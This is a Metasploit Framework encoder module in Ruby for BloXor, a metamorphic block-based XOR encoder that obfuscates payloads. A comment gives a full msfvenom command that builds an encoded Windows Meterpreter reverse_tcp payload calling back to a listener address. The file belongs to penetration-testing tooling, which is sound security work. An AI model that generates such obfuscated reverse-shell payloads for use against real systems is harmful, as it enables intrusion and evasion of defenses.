##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/encoder/bloxor/bloxor'

#
# BloXor is a cross architecture metamorphic block based xor encoder/decoder for Metasploit.
# BloXor was inspired by the Shikata Ga Nai encoder (./msf/modules/encoders/x86/shikata_ga_nai.rb)
# by spoonm and the Rex::Poly::Block (./msf/lib/rex/poly/block.rb) code by skape.
#
# Please refer to ./msf/lib/rex/encoder/bloxor/bloxor.rb for BloXor's implementation and to
# ./msf/lib/rex/poly/machine/machine.rb and ./msf/lib/rex/poly/machine/x86.rb for the
# backend metamorphic stuff.
#
# A presentation at AthCon 2012 by Dimitrios A. Glynos called 'Packing Heat!' discusses a
# metamorphic packer for PE executables and also uses METASM.  I am unaware of any code having
# been publicly released for this, so am unable to compare implementations.
# http://census-labs.com/media/packing-heat.pdf
#
# Manually check the output with the following command:
# >ruby msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.2.2 LHOST=192.168.2.1 LPORT=80 -a x86 -e x86/bloxor -b '\x00' -f raw | ndisasm -b32 -k 128,1 -
#

class MetasploitModule < Rex::Encoder::BloXor

  # Note: Currently set to manual, bump it up to automatically get selected by the framework.
  # Note: BloXor by design is slow due to its exhaustive search for a solution.
  Rank = ManualRanking

  def initialize
    super(
      'Name'        => 'BloXor - A Metamorphic Block Based XOR Encoder',
      'Description' => 'A Metamorphic Block Based XOR Encoder.',
      'Author'      => [ 'sf' ],
      'Arch'        => ARCH_X86,
      'License'     => MSF_LICENSE,
      'EncoderType' => Msf::Encoder::Type::Unspecified
      )
  end

  def compute_decoder( state )

    @machine = Rex::Poly::MachineX86.new( state.badchars )

    super( state )
  end
end
